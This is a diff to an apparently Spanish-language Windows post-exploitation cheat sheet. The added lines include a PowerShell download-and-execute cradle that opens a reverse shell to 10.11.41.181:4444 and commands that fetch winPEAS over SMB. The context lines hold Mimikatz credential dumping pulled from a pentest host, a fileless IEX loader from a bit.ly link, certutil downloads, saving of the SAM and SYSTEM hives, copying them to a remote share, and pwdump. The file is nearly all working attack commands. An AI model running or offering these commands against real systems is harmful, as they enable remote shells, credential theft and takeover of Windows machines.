@@ -10,6 +10,7 @@ C:\> powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Inv
 # Descargar + ejecutar sin tocar el disco
 C:\> powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
 powershell.exe -exec bypass -command "IEX(New-Object System.Net.WebClient).DownloadString('http://$PENTEST_BOX_IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
+powershell.exe -exec bypass -command "IEX(New-Object System.Net.WebClient).DownloadString('http://10.11.41.181:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.41.181 -Port 4444"
 
 # Descargas via CLI en windows
 powershell.exe -c "Invoke-WebRequest -Uri 'http://10.8.50.72/Advanced.exe' -OutFile 'c:\program files (x86)\IObit\Advanced.exe'"
@@ -22,6 +23,7 @@ certutil.exe -f -urlcache -split http://ip/file file
 
 # copiar archivos via compartida
 copy \\IP\SHARE\FILE FILE
+c:\tmp>copy \\10.11.14.106\smbfolder\winPEAS.exe winPEAS.exe
 
 # Firewall rules en Windows
 netsh advfirewall firewall add rule name=NOMBRE_REGLA protocol=PROTO dir=in localport=PORT action=allow
@@ -38,5 +40,10 @@ reg save HKLM\SYSTEM system.backup
 
 copy sam.backup \\IP\smbfolder\sam
 copy system.backup \\IP\smbfolder\system
-
 pwdump system sam
+
+# comandos
+whoami /priv
+Start-Process "shell.exe"
+systeminfo
+net localgroup Administrators --> lista los miembros del grupo Administrators
